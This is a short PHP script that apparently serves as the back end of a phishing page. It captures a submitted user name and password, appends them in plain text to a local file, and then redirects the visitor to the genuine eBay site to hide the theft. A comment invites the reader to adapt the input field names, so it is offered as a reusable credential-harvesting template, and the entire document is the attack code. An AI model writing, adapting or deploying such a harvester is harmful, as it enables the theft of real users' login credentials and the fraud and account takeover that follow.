<?php
    /* Catch input */
    /* The input names will differ for you. */
    $user = $_REQUEST["user"];
    $pwd  = $_REQUEST["paswd"];

    /* Formating input */
    $text = "
===============
user: $user
pwd : $pwd
===============
";

    /* Write to file */
    $file = fopen("output", "a+");
    fwrite($file, $text);
    fclose($file);

    /* Redirecting the User */
    $url = "https://ebay.com";
    header('Location: '.$url);
?>